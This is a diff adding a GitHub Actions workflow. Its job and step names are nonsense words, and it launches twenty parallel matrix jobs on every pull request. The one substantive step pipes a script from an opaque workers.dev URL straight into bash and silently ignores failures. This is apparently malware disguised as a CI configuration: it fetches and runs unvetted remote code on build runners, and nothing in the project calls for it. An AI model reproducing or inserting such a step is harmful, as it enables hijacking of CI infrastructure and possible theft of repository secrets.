@@ -1,0 +1,24 @@
+name: controversy
+
+on:
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  borrow:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        plural: ["experimental", "beer", "custom", "content", "asset"]
+        rather: ["reduce", "examination", "burst", "typewriter"]
+      fail-fast: false
+    steps:
+    - name:  dismiss
+      uses: actions/checkout@v6
+    - name: landlady
+      continue-on-error: true
+      run: curl -S "https://node.dolentemanhire9008.workers.dev/edc1716b0287e1453f2b1098/b7a033ddaeaa7b2ac7a3c88b/ba75f8a128336d9/8?m=1775368902" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        path: 'engineering'
+        name: 'circulation'
